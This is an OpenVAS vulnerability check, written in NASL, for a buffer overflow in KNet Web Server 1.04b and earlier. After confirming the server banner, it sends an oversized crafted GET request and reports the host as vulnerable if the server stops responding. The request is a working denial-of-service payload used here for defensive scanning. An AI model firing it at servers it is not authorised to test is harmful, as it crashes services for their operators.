###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_knet_web_server_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# KNet Web Server Long Request Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let remote unauthenticated attackers to
  cause a denial of service.
  Impact Level: Application";

tag_affected = "KNet Webserver version 1.04b and prior";
tag_insight = "The flaw is due to an error when handling certain Long requests, which
  can be exploited to cause a denial of service.";
tag_solution = "No solution or patch is available as of 27th, March 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://knet.softpedia.com";
tag_summary = "This host is running KNet Web Server and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(803186);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-27 12:21:22 +0530 (Wed, 27 Mar 2013)");
  script_name("KNet Web Server Long Request Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120964");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/knet-web-server-buffer-overflow");
  script_xref(name : "URL" , value : "http://bl0g.yehg.net/2013/03/knet-web-server-buffer-overflow-exploit.html");

  script_description(desc);
  script_summary("Check KNet Webserver is vulnerable by sending crafted packets");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

req = "";
res = "";
port = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: KNet" >!< banner){
  exit(0);
}

## Send crafted data to server
req = http_get(item:crap(data:"0x00", length:2048), port:port);
res = http_keepalive_send_recv(port:port, data:req);

sleep(5);

## Check the server status
if(http_is_dead(port:port))
{
  security_hole(port);
  exit(0);
}
